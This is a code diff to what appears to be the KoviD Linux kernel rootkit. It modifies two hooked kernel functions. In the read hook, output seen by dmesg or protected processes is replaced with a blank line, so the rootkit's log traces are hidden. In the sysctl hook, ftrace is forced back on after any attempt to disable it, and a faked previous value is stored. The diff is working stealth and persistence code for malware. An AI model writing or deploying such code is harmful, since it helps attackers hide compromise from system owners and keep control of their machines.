@@ -302,7 +302,25 @@ static asmlinkage long m_read(struct pt_regs *regs) {
         /** if kovid is here, skip */
         if (is_dmesg ||
             is_sys_parent((unsigned int)PT_REGS_PARM1(regs)))
-            rv=0;
+        {
+            /** We'll add a new line
+             * without any timestamp
+             * */
+            const char *obuf = "\n";
+            size_t olen = strlen(obuf);
+
+            if (olen > rv)
+                olen = rv;
+
+            if (copy_to_user((char __user *)arg, obuf, olen))
+                goto out;
+
+            if (olen < rv) {
+                if (copy_to_user((char __user *)arg + olen, "\0", 1))
+                    goto out;
+            }
+            rv = olen;
+        }
     }
 out:
     kv_mem_free(&fs, &buf);
@@ -943,12 +961,10 @@ static int m_proc_dointvec(struct ctl_table *table, int write,
 
         (void)_ftrace_intercept_init(true);
 
-        if (val == 0) {
+        if (val == 0)
             *(int *)(table->data) = 1;
-            snprintf(kv_prev_ftrace_enabled, sizeof(kv_prev_ftrace_enabled), "%d\n", val);
-        } else {
-            snprintf(kv_prev_ftrace_enabled, sizeof(kv_prev_ftrace_enabled), "%d\n", val);
-        }
+
+        snprintf(kv_prev_ftrace_enabled, sizeof(kv_prev_ftrace_enabled), "%d\n", val);
 
     }
     return rc;
